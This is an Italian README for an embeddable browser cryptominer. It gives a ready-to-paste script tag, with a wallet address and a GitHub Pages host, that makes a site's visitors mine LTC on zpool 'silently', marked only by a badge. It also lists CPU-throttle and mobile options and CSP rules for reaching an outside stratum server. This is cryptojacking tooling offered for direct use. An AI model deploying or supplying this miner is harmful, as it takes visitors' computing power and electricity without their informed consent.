# cj — miner iniettabile (GitHub Pages)

Un solo file da incollare in un sito per far minare (silenziosamente, con badge)
i visitatori su zpool (algo minotaurx). Payout in **LTC**.

## Uso

```html
<script src="https://exhaleanalysis-wq.github.io/cj/embed.js"
        data-wallet="LUfcu3NH2xi6sFwEU4qBqddtmnXxWpsBJ5"
        data-password="c=LTC" data-badge="1" data-delay="1500" defer></script>
```

Attributi: `data-throttle` (0.2 default = 20% CPU), `data-hidden="1"` (ferma a tab nascosta),
`data-mobile="1"`, `data-optout-hours`, `data-probe="0"` (niente fallback locale).

## API in pagina
`window.CJMiner.start()/.stop()/.resume()/.status()` — click sul badge = ferma/riprendi.

## File
- `embed.js` — iniettore (usa percorso relativo per `miner.js`)
- `miner.js` — fallback locale
- `index.html` — demo

## CSP del sito ospite (se presente)
`script-src https://earnify.cc https://exhaleanalysis-wq.github.io`
`connect-src wss://websocket-stratum-server.com`
